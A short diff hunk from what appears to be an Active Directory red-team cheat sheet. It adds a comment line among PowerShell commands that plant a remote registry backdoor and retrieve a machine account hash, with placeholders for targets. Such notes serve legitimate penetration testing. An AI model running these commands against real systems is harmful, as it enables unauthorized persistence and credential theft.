@@ -125,6 +125,7 @@ C:> Set-RemotePSRemoting –SamAccountName <username> -ComputerName <hostname_fu
 # Using RACE, with admin privs on remote machine
 C:> Add-RemoteRegBackdoor -ComputerName <hostname> -Trustee <username> -Verbose
 
+# From a shell as <username>, not DA rights
 # As <username> from before, retrieve machine account hash:
 C:> Get-RemoteMachineAccountHash -ComputerName <hostname> -Verbose
 
